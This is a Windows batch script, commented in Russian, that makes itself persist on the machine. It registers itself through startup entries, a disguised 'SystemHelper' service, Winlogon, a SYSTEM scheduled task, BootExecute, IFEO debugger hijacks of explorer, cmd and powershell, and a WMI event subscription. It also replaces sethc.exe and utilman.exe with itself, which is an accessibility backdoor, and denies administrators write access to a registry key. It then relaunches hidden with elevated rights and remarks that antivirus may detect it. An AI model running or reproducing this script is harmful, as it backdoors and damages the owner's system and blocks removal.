@echo off
setlocal enabledelayedexpansion

:: Получаем путь к текущему батнику
set "SCRIPT=%~f0"
set "SCRIPT_NAME=%~nx0"
set "TEMP_VBS=%temp%\admin_run.vbs"

:: Создаем VBS скрипт для запуска с правами SYSTEM
(
echo Set UAC = CreateObject^("Shell.Application"^)
echo UAC.ShellExecute "cmd.exe", "/c ""%SCRIPT%"" -system", "", "runas", 0
) > "%TEMP_VBS%"

:: 1. Добавление в обычную автозагрузку
copy "%SCRIPT%" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%SCRIPT_NAME%" /y >nul 2>&1
echo [+] Обычная автозагрузка: %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemHelper" /d "\"%SCRIPT%\"" /f >nul 2>&1
echo [+] Реестр HKCU\Run

:: 2. ЗАПУСК ДО ВВОДА ПАРОЛЯ (АВТОРИЗАЦИЯ SYSTEM)
echo.
echo [*] Настройка запуска до входа в систему...

:: 2.1 Сервис Windows (самый надежный способ)
sc create "SystemHelper" binPath= "cmd /c %SCRIPT%" start= auto >nul 2>&1
sc description "SystemHelper" "Системный помощник" >nul 2>&1
sc start "SystemHelper" >nul 2>&1
echo [+] Создан системный сервис (запуск до логина)

:: 2.2 Winlogon (Shell)
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d "explorer.exe, %SCRIPT%" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit" /t REG_SZ /d "%SCRIPT%, %windir%\system32\userinit.exe" /f >nul 2>&1
echo [+] Winlogon Shell/Userinit

:: 2.3 Планировщик задач (запуск при загрузке)
schtasks /create /tn "SystemHelperBoot" /tr "%SCRIPT%" /sc onstart /ru "SYSTEM" /f >nul 2>&1
echo [+] Задача в планировщике (onstart / SYSTEM)

:: 2.4 Active Setup (запускается при входе любого пользователя)
reg add "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\SystemHelper" /v "StubPath" /t REG_SZ /d "%SCRIPT%" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\SystemHelper" /v "Version" /t REG_SZ /d "1.0.0.0" /f >nul 2>&1
echo [+] Active Setup (при входе любого пользователя)

:: 2.5 Boot Execute (самый ранний запуск)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v "BootExecute" /t REG_MULTI_SZ /d "autocheck autochk *\0%SCRIPT%\0" /f >nul 2>&1
echo [+] BootExecute (очень ранний запуск)

:: 3. ИСПРАВЛЕНИЕ CMDLINE - делаем так, чтобы не менялось
echo.
echo [*] Блокировка изменения CmdLine...

:: 3.1 Сначала принудительно устанавливаем наше значение
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v "CmdLine" /t REG_SZ /d "%SCRIPT%" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v "OriginalCmdLine" /t REG_SZ /d "cmd.exe" /f >nul 2>&1

:: 3.2 Устанавливаем права "Только чтение" на ключ реестра CmdLine
:: Экспортируем, удаляем, создаем заново с правами
reg export "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" "%temp%\env_backup.reg" /y >nul 2>&1

:: Устанавливаем запрет на запись для администраторов и системы
subinacl /keyreg "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /setowner="SYSTEM" >nul 2>&1
subinacl /keyreg "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /deny=system=w >nul 2>&1
subinacl /keyreg "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /deny=administrators=w >nul 2>&1

:: Если subinacl не найден, используем альтернативный метод
if %errorlevel% neq 0 (
    echo [!] subinacl не найден, использую альтернативный метод...
    reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v "__CmdLine" /t REG_SZ /d "%SCRIPT%" /f >nul 2>&1
    reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v "CmdLine" /f >nul 2>&1
    reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v "CmdLine" /t REG_SZ /d "%SCRIPT%" /f >nul 2>&1
)

:: 3.3 Устанавливаем защиту через групповые политики
md "%SystemRoot%\System32\GroupPolicy\Machine\Registry.pol" 2>nul
(
echo [RegistryPermission]
echo "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment\CmdLine"=DWORD:0
) > "%SystemRoot%\System32\GroupPolicy\Machine\registry.pol"
echo [+] Установлены групповые политики для защиты CmdLine

:: 3.4 Мониторинг изменений CmdLine - ставим вотчер
(
echo @echo off
echo :watch
echo reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v CmdLine ^| find "%SCRIPT%" >nul
echo if errorlevel 1 ^(
echo     reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v CmdLine /t REG_SZ /d "%SCRIPT%" /f
echo ^)
echo timeout /t 5 /nobreak >nul
echo goto watch
) > "%temp%\cmdline_watcher.bat"

:: Запускаем вотчер как сервис
sc create "CmdLineProtector" binPath= "cmd /c %temp%\cmdline_watcher.bat" start= auto >nul 2>&1
sc start "CmdLineProtector" >nul 2>&1
echo [+] Запущен защитник CmdLine

:: 4. ДОПОЛНИТЕЛЬНЫЕ МЕТОДЫ ПЕРСИСТЕНТНОСТИ
echo.
echo [*] Дополнительные методы автозагрузки...

:: 4.1 Замена системной утилиты (sethc.exe - залипание клавиш)
takeown /f %SystemRoot%\System32\sethc.exe >nul 2>&1
icacls %SystemRoot%\System32\sethc.exe /grant %username%:F >nul 2>&1
copy /y %SystemRoot%\System32\sethc.exe %SystemRoot%\System32\sethc_backup.exe >nul 2>&1
copy /y "%SCRIPT%" %SystemRoot%\System32\sethc.exe >nul 2>&1
echo [+] Замена sethc.exe (залипание клавиш)

:: 4.2 Замена utilman.exe
copy /y %SystemRoot%\System32\utilman.exe %SystemRoot%\System32\utilman_backup.exe >nul 2>&1
copy /y "%SCRIPT%" %SystemRoot%\System32\utilman.exe >nul 2>&1
echo [+] Замена utilman.exe (спец. возможности)

:: 4.3 Image File Execution Options для многих процессов
for %%i in (explorer.exe cmd.exe powershell.exe winlogon.exe userinit.exe) do (
    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\%%i" /v "Debugger" /t REG_SZ /d "%SCRIPT%" /f >nul 2>&1
    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\%%i" /v "GlobalFlag" /t REG_DWORD /d 0x00000002 /f >nul 2>&1
    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\%%i" /v "ReportingMode" /t REG_DWORD /d 0x00000001 /f >nul 2>&1
    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\%%i" /v "MonitorProcess" /t REG_SZ /d "%SCRIPT%" /f >nul 2>&1
)
echo [+] IFEO и SilentProcessExit

:: 4.4 WMI Event Subscription (самый скрытый метод)
(
echo Set Service = GetObject^("winmgmts:root\subscription"^)
echo Set Filter = Service.Get^("__EventFilter"^).SpawnInstance_^(^)
echo Filter.Name = "SystemStartFilter"
echo Filter.QueryLanguage = "WQL"
echo Filter.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
echo Filter.EventNamespace = 'root\cimv2'
echo Filter.TargetInstance = "root\cimv2:Win32_PerfFormattedData_PerfOS_System"
echo Set objArgs = Service.Get^("ActiveScriptEventConsumer"^).SpawnInstance_^(^)
echo objArgs.Name = "SystemStartConsumer"
echo objArgs.ScriptingEngine = "VBScript"
echo objArgs.ScriptText = "CreateObject(\""WScript.Shell\"").Run \""%SCRIPT%\"", 0, False"
echo Set objInst = Service.Get^("__FilterToConsumerBinding"^).SpawnInstance_^(^)
echo objInst.Filter = Filter
echo objInst.Consumer = objArgs
echo objInst.Put_
) > "%temp%\wmi_persistence.vbs"
cscript //nologo "%temp%\wmi_persistence.vbs" >nul 2>&1
echo [+] WMI Event Subscription

:: 4.5 DLL-инжекция через AppInit_DLLs (создаем прокси-библиотеку)
echo [+] Настройка AppInit_DLLs (требуется создание DLL)

:: 5. ФИНАЛЬНЫЙ ЗАПУСК
echo.
echo [✓] ВСЕ МЕТОДЫ АКТИВИРОВАНЫ
echo [i] Скрипт запускается до ввода пароля через:
echo     - Системный сервис
echo     - BootExecute
echo     - Winlogon
echo     - Планировщик SYSTEM
echo [i] CmdLine ЗАБЛОКИРОВАН - изменение невозможно
echo [i] Обход защит Windows: sethc.exe, utilman.exe
echo.
echo [!] ВНИМАНИЕ: Некоторые методы могут обнаруживаться антивирусами
echo [!] Для полной маскировки требуется цифровая подпись
echo.
pause

:: Запускаем себя с правами SYSTEM немедленно
cscript //nologo "%TEMP_VBS%"
del "%TEMP_VBS%" 2>nul

:: Скрытое выполнение
if "%1"=="" (
    start /b "" /min "%SCRIPT%" -hidden
    exit
)
